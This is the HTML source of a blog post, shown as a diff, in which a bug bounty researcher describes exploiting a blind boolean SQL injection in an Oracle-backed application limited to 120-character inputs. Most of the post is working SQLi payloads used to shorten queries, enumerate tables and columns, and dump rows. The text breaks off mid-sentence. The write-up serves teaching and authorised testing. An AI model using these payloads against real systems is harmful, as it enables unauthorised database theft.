@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Defeating Length Filters to Dump the Database - SQLi :: kuldeepdotexe&#39;s blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="A blog about how I managed to bypass length filter on an SQLi to dump the database" />
+<meta name="keywords" content="SQL injection, SQLi, SQLi Payloads, SQLi Exploit, SQLi Payload, SQL Injection Payloads, SQL Injection Payload" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://kuldeep.io/posts/defeating-length-filters-to-dump-the-database-sqli/" />
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8LMH0XXR2S"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8LMH0XXR2S', { 'anonymize_ip': false });
+}
+</script>
+
+
+
+<link rel="stylesheet" href="https://kuldeep.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://kuldeep.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://kuldeep.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://kuldeep.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="kuldeepdotexe" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Defeating Length Filters to Dump the Database - SQLi">
+<meta property="og:description" content="A blog about how I managed to bypass length filter on an SQLi to dump the database" />
+<meta property="og:url" content="https://kuldeep.io/posts/defeating-length-filters-to-dump-the-database-sqli/" />
+<meta property="og:site_name" content="kuldeepdotexe&#39;s blog" />
+
+  <meta property="og:image" content="https://kuldeep.io/">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2023-12-06 20:39:44 &#43;0530 IST" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8LMH0XXR2S"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8LMH0XXR2S', { 'anonymize_ip': false });
+}
+</script>
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Kuldeep&#39;s Blog
+  </div>
+</a>
+
+    </div>
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://kuldeep.io/posts/defeating-length-filters-to-dump-the-database-sqli/">Defeating Length Filters to Dump the Database - SQLi</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2023-12-06
+        
+      </span>
+    
+    
+      <span class="post-author">:: Kuldeep Pandya</span>
+    
+    
+      <span class="post-reading-time">:: 12 min read (2495 words)</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://kuldeep.io/tags/sqli/">SQLi</a>&nbsp;
+    
+  </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>Hello, hackers!</p>
+<p>As usual, this blog post will focus on my recent findings. This time, it was an SQL injection. Most SQL injections I find are very trivial and do not require a separate blog post.</p>
+<p>However, this particular SQL injection was far from being straightforward. It required me to work 13+ hours to successfully dump the database. Although some of the tricks that I used for this SQL injection are not new and can be found with a bit of Google search, I learned them the hard way.</p>
+<p>This blog post aims to share with the community the tricks that I learned. I hope that these tricks will be helpful to someone who encounters similar challenges.</p>
+<p>In this blog post, I will cover my entire thought process and journey from detection to full exploitation of the SQL injection.</p>
+<p>For your convenience, I will break apart this blog into several sections. These sections will be as follows:</p>
+<ol>
+<li>Discovery</li>
+<li>Running SQLMap And Discovering The Balanced Query</li>
+<li>SQLMap Failing To Dump The Database</li>
+<li>Discovering Length Filter</li>
+<li>Dumping The Database Name</li>
+<li>Dumping The Table Name</li>
+<li>Finding A Way To Use Limits And Offsets</li>
+<li>Finding The Shortest Possible Payload</li>
+<li>Successfully Dumping Table Names</li>
+<li>Guessing Column Names</li>
+<li>Dumping The Rows</li>
+</ol>
+<p>These look like a lot of sections. This is because they are! I am trying to crunch up 13+ hours of work into a single blog. Brace yourself for a long read.</p>
+<h3 id="discovery">Discovery<a href="#discovery" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>A new target was onboarded to me on the Synack Red Team platform. However, it was an old target launched under a new name. No surprise there.</p>
+<p>While this target was previously onboarded, I sent a few SQLis. Because of this, I was certain that I could find more SQLis this time.</p>
+<p>As usual, I browsed the application like a normal user and checked the requests that the application sent. I tested each request manually for SQL injections.</p>
+<p>The &ldquo;manual testing&rdquo; part for me is mostly injecting special characters into different parameters and observing the behavior of the application.</p>
+<p>While testing for SQL injection on a particular request, I noticed the following behavior:</p>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Response Length</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td>422k Bytes</td>
+</tr>
+<tr>
+<td><code>'</code></td>
+<td>33k Bytes</td>
+</tr>
+<tr>
+<td><code>'-- -</code></td>
+<td>33k Bytes</td>
+</tr>
+<tr>
+<td><code>')-- -</code></td>
+<td>422k Bytes</td>
+</tr>
+</tbody>
+</table>
+<p>Note: The first value is nothing. I sent nothing. It is the normal response the application would send.</p>
+<p>This was intriguing behavior. It looked like a potential SQL injection. I tried a few more SQLi payloads but I could not find the right payload for it.</p>
+<h3 id="running-sqlmap-and-discovering-the-balanced-query">Running SQLMap And Discovering The Balanced Query<a href="#running-sqlmap-and-discovering-the-balanced-query" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>To find the correct query, I sent the request to <a href="https://github.com/sqlmapproject/sqlmap">SQLMap</a>. SQLMap successfully discovered the SQL injection and gave me the query that would give me a boolean response.</p>
+<p>It gave me the following payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#ae81ff">123</span><span style="color:#e6db74">&#39; AND (SELECT (CASE WHEN (4747=4747) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4747) END) FROM DUAL) IS NULL OR &#39;</span>iTjZ<span style="color:#e6db74">&#39;=&#39;</span>tEus
+</span></span></code></pre></div><h4 id="payload-explanation">Payload Explanation<a href="#payload-explanation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<ol>
+<li><code>SELECT (...) FROM DUAL</code>: This is just a simple <code>SELECT</code> query that encapsulates the underlying <code>CASE...WHEN</code> statement.</li>
+<li><code>CASE WHEN (condition) THEN &lt;true statement&gt; ELSE &lt;false statement&gt; END</code>: This section is the most important as <code>CASE...WHEN</code> will execute a <code>true</code> or <code>false</code> statement based on the condition. It is similar to the classic <code>if…else</code> in different programming languages.</li>
+<li><code>4747=4747</code>: This is an always true condition as 4747 is always equal to 4747.</li>
+<li><code>CTXSYS.DRITHSX.SN(1,4747)</code>: This is a function call to an internal Oracle DBMS function. I could not find much documentation about the function. But in this payload, this function should respond with an error message.</li>
+</ol>
+<p>So, the payload checks if 4747 is equal to 4747 (which is true) then it selects <code>NULL</code> and compares <code>NULL</code> with <code>NULL</code> (which is also true). This will result in a true response.</p>
+<p>If we wanted to receive a false response, we would replace <code>4747=4747</code> with <code>4747=4848</code>.</p>
+<p>I now had a working payload. I tried to enumerate the databases using SQLMap. However, SQLMap failed to enumerate the databases.</p>
+<p>I was not surprised by this behavior because, during my initial enumeration, I noticed that the server correctly filtered out some characters. These characters included but were not limited to the following:</p>
+<ul>
+<li><code>&quot;</code></li>
+<li><code>#</code></li>
+<li><code>`</code></li>
+</ul>
+<p>Due to these character filters, SQLMap was unable to enumerate the databases. I decided to do the database dumping by hand.</p>
+<p>I simplified the SQLMap&rsquo;s payload to the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#ae81ff">123</span><span style="color:#e6db74">&#39; AND (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    SELECT (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    	CASE 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        	WHEN (1=1) THEN NULL 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        	ELSE 1/0 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    	END
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ) FROM DUAL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">) IS NULL OR &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><h3 id="discovering-length-filter">Discovering Length Filter<a href="#discovering-length-filter" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>After doing a little back and forth with the payloads, I realised that some payloads were not acting as they should be.</p>
+<p>For example, the following payload resulted in a <code>302 Found</code> response rather than a <code>200 OK</code> response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#ae81ff">123</span><span style="color:#e6db74">&#39; AND (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    SELECT (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    	CASE 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        	WHEN (12345678901234567890=12345678901234567890) THEN NULL 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        	ELSE 1/0 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    	END
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ) FROM DUAL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">) IS NULL OR &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Although they are both the same numbers, the server was resulting in a <code>302 Found</code> response. Usually, the server responded in a <code>302 Found</code> response when we sent a character that the server was filtering.</p>
+<p>However, we did not send any bad characters in this payload. The <code>1=1</code> payload was found to be working previously.</p>
+<p>I changed the condition from <code>12345678901234567890=12345678901234567890</code> to <code>1234567890=1234567890</code> and the server returned <code>200 OK</code> with a <code>true</code> response.</p>
+<p>This was evident that something weird happened when we sent a large payload. There must be some sort of length filter on the backend that prevents us from sending long payloads.</p>
+<p>After adding one character at a time, I figured out that if we send any more characters than <strong>120</strong>, the server would not process the request and we would receive a <code>302 Found</code> response. Whatever payload we use must be less than or equal to 120 characters.</p>
+<p>I tried to see ways in which I could shorten the payload. I learned that we can replace <code>NULL</code> with <code>1</code> in the payload and it will work just fine. The resulting <em>shorter</em> payload was:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39; AND (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	SELECT (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		CASE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">			WHEN (1=1) THEN 1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">			ELSE 1/0 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		END
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	) FROM DUAL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">)=1 OR &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>We moved from requiring 86 characters to 74 characters! Excellent!</p>
+<p>I suspected that the <code>SELECT</code> statement around the <code>CASE...WHEN</code> statement was necessary. I tried removing it and it turns out that it was optional! We can directly use <code>CASE...WHEN</code> without wrapping it using <code>SELECT</code>. Our payload was even shorter now.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39; AND (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	CASE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		WHEN (1=2) THEN 1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		ELSE 1/0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	END
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">)=1 OR &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>This payload was merely 55 characters long!</p>
+<h3 id="dumping-the-database-name">Dumping The Database Name<a href="#dumping-the-database-name" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>It was now time to enumerate the database names. My strategy to dump the database name was as follows:</p>
+<ol>
+<li>Find out the length of the current database name. We will refer to the length of the database as <code>len</code>.</li>
+<li>Use a substring payload where the <code>SUBSTR()</code> function starts from the first character of the database and goes till <code>len</code>.</li>
+<li>Enumerate one character at a time.</li>
+</ol>
+<p>To determine the database length, I used the following payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39; AND (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	CASE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		WHEN ((SELECT LENGTH(SYS.DATABASE_NAME) FROM DUAL)&gt;0) THEN 1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		ELSE 1/0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	END
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">)=1 OR &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>The above payload checks if the length of the current database name is greater than 0. This is true for any database name. Hence, we get a <code>true</code> response.</p>
+<p>By increasing one number at a time, we get to know that the database name is exactly <strong>6</strong> characters long.</p>
+<p>To dump the database name, I used a <code>SUBSTR()</code> payload that looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39; AND (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	CASE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		WHEN ((SELECT ASCII(SUBSTR(SYS.DATABASE_NAME,1,1)) FROM DUAL)&gt;0) THEN 1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		ELSE 1/0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	END
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">)=1 OR &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><h4 id="payload-explanation-1">Payload Explanation<a href="#payload-explanation-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<ol>
+<li><code>SUBSTR(SYS.DATABASE_NAME,1,1)</code>: This part returns the very first character of the database name.</li>
+<li><code>ASCII(...)</code>: This function converts the first character of the database name to its corresponding ASCII value.</li>
+<li><code>ASCII(SUBSTR(...))&gt;0</code>: This part checks if the ASCII value of the first character is greater than 0 (which is always true unless the server uses Unicode database names).</li>
+</ol>
+<p>In theory, we can keep increasing from <code>0</code> to up to <code>127</code>. However, valid database names start after <code>45</code> (ASCII value of <code>-</code>) and go up to <code>122</code> (ASCII value of lowercase <code>z</code>).</p>
+<p>I did the brute force for each character and found out the database name to be &ldquo;<strong>SYNACK</strong>&rdquo; (obviously fake because I will not reveal client details).</p>
+<h3 id="dumping-the-table-name">Dumping The Table Name<a href="#dumping-the-table-name" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Now that we know the database name, it was our turn to dump the table names. Using <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md">PayloadsAllTheThings</a>, I came across the following query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">table_name</span> <span style="color:#66d9ef">FROM</span> all_tables
+</span></span></code></pre></div><p>However, this query would return multiple rows in the response. Using our technique, we can only dump one row and one column, one character at a time. It is very slow but this is the best that we have got.</p>
+<p>Following the PayloadsAllTheThings page, I knew that we could use the <code>ROWNUM</code> pseudo-column to filter from the number of rows returned by the query. Incorporating this into our payload, this was our payload that finds the length of the first table from the <code>all_tables</code> view:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39; AND (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	CASE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		WHEN ((SELECT LENGTH(table_name,1,1) FROM all_tables WHERE ROWNUM=1)=0) THEN 1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		ELSE 1/0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	END
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">)=1 OR &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Increasing the number, I found out that the table was <strong>4</strong> characters long.</p>
+<p>After using a <code>SUBSTR()</code> payload, I discovered the table name was &ldquo;<strong>DUAL</strong>&rdquo;. :/ For a practical proof-of-concept, we will need a table that is not a system table. It should contain some client data.</p>
+<p>I changed from <code>ROWNUM=1</code> to <code>ROWNUM=2</code> in the hope that it would give me the next row. However, in Oracle, the <code>ROWNUM</code> pseudo-column works in an unexpected way. We cannot directly provide a row number apart from <code>ROWNUM=1</code>.</p>
+<h3 id="finding-a-way-to-use-limits-and-offsets">Finding A Way To Use Limits And Offsets<a href="#finding-a-way-to-use-limits-and-offsets" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>We had to find a different solution that would limit the number of rows returned by the SQL query. MySQL has <code>LIMIT</code> and <code>OFFSET</code> statements that can be used to limit the number of rows. I knew a little about Oracle limits. Upon doing further Google searches, I found out that we need to use <code>OFFSET...FETCH</code> statements if we wish to limit the results.</p>
+<p>An example usage would be like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39; AND (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	CASE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		WHEN ((SELECT LENGTH(table_name,1,1) FROM all_tables OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY)=0) THEN 1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		ELSE 1/0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	END
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">)=1 OR &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>However, this payload would exceed our maximum limit of 120 characters. :(</p>
+<h3 id="finding-the-shortest-possible-payload">Finding The Shortest Possible Payload<a href="#finding-the-shortest-possible-payload" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>I shifted my focus toward crafting the shortest payload that would give me a boolean response. I played around with the payload a bit and I discovered that in some places, spaces were optional. We could eliminate spaces!</p>
+<p>For example, consider the following <code>CASE...WHEN</code> payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#66d9ef">CASE</span> <span style="color:#66d9ef">WHEN</span> (<span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">THEN</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">ELSE</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">END</span> <span style="color:#75715e">-- 35 characters
+</span></span></span></code></pre></div><p>This can be rewritten to eliminate spaces like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#66d9ef">CASE</span> <span style="color:#66d9ef">WHEN</span>(<span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)<span style="color:#66d9ef">THEN</span> <span style="color:#ae81ff">1</span><span style="color:#66d9ef">ELSE</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0</span><span style="color:#66d9ef">END</span> <span style="color:#75715e">-- 31 characters
+</span></span></span></code></pre></div><p>Considering this in mind, I crafted the shortest possible payload that provided me with a boolean response as:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39;AND(CASE WHEN(1=1)THEN 1ELSE 1/0END)=1OR&#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span> <span style="color:#75715e">-- 47 characters
+</span></span></span></code></pre></div><p>By doing this, we effectively moved from 86 characters to 47 characters. This was a massive improvement!</p>
+<h3 id="successfully-dumping-table-names">Successfully Dumping Table Names<a href="#successfully-dumping-table-names" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>With our refined payload and using offsets, I went on to dump the table names. I skipped the first table that was &ldquo;DUAL&rdquo; and started dumping the second table name. To do this, I used the following payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39;AND(CASE WHEN((SELECT table_name FROM all_tables OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY)&gt;&#39;</span>A<span style="color:#e6db74">&#39;)THEN 1ELSE 1/0END)=1OR&#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span> <span style="color:#75715e">-- 120 characters
+</span></span></span></code></pre></div><p>Using this payload, I dumped the first three characters from the table name that was &ldquo;<strong>SYS</strong>&rdquo;. After dumping the third character, the payload becomes exactly 120 characters long and we cannot dump any further.</p>
+<p>I found a workaround for this by using the <code>LIKE</code> statement and eliminating offsets and limits. Here is the payload that I used:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39;AND(CASE WHEN((SELECT COUNT(*) FROM all_tables WHERE table_name LIKE &#39;</span>SYS_______<span style="color:#e6db74">&#39;)&gt;0)THEN 1ELSE 1/0END)=1OR&#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span> <span style="color:#75715e">-- 114 characters
+</span></span></span></code></pre></div><p>Enumerating the table name one character at a time, I found that the table name was &ldquo;<strong>SYSTEMTBL$</strong>&rdquo;. I could not enumerate the last $ character because it was a bad character. However, I googled the table name and found out that it was also a system table and the table name ended with a $.</p>
+<p>I tried to play around with the offset values to enumerate more table names but almost all of them turned out to be system tables.</p>
+<p>To find a table that was not a system table, I did some guesswork. As I mentioned earlier in the blog, this application was a retest. I had already sent plenty of SQLis on this application. Due to this, I was fortunate enough to know the naming convention of the tables. I knew the table names had the following prefix: &ldquo;<strong>SYN_</strong>&rdquo;.</p>
+<p>I crafted a payload to check for tables that had the &ldquo;<strong>SYN_</strong>&rdquo; prefix. The payload looked like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39;AND(CASE WHEN((SELECT COUNT(*) FROM all_tables WHERE table_name LIKE &#39;</span>SYN____<span style="color:#e6db74">&#39;)=1)THEN 1ELSE 1/0END)=1OR&#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span> <span style="color:#75715e">-- 111 characters
+</span></span></span></code></pre></div><p>This payload was successful and I enumerated the table name to be &ldquo;<strong>SYN_NEW</strong>&rdquo;.</p>
+<h3 id="guessing-column-names">Guessing Column Names<a href="#guessing-column-names" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Next up, we had to enumerate the column names from the &ldquo;SYN_NEW&rdquo; table. For this, I tried to craft a payload like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39;AND(CASE WHEN((SELECT OWNER FROM all_tab_columns WHERE table_name=&#39;</span>SYN_NEW<span style="color:#e6db74">&#39;ANDROWNUM=1)&gt;0)THEN 1ELSE 1/0END)=1OR&#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span> <span style="color:#75715e">-- 119 characters
+</span></span></span></code></pre></div><p>However, this payload would not work. The <code>(SELECT OWNER FROM all_tab_columns WHERE table_name='SYN_NEW'ANDROWNUM=1)</code> subquery returns a string and we must compare it with a string to get a meaningful result. Even if we try to compare it with the ASCII value of the first character, we would be limited to enumerating the first character of the column name. We had just enough space to fit a single character.</p>
+<p>I could not think of anything from here. So, I decided to brute force the column names. To perform the brute force, I used the following payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39;AND(CASE WHEN((SELECT LENGTH(§test§) FROM SYN_NEW OFFSET 1ROWS FETCH NEXT 1ROWS ONLY)&gt;0)THEN 1ELSE 1/0END)=1OR&#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span> <span style="color:#75715e">-- 115 characters
+</span></span></span></code></pre></div><p>I brute-forced using the <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt">burp-parameter-names.txt</a> wordlist.</p>
+<p>And quickly enough, I found one column &ldquo;<strong>user</strong>&rdquo;.</p>
+<h3 id="dumping-the-rows">Dumping The Rows<a href="#dumping-the-rows" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>From here, the database dump was quite easy, I just used the following payload to dump one row at a time:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39;AND(CASE WHEN((SELECT user FROM SYN_NEW OFFSET 1ROW FETCH NEXT 1ROW ONLY)&gt;&#39;</span>SYN<span style="color:#e6db74">&#39;)THEN 1ELSE 1/0END)=1OR&#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span> <span style="color:#75715e">-- 108 characters
+</span></span></span></code></pre></div><p>I enumerated the first row to be &ldquo;<strong>SYN_WAS</strong>&rdquo;. To confirm that what we dumped was indeed a valid row and was not a fluke, I used the following payload:</p>
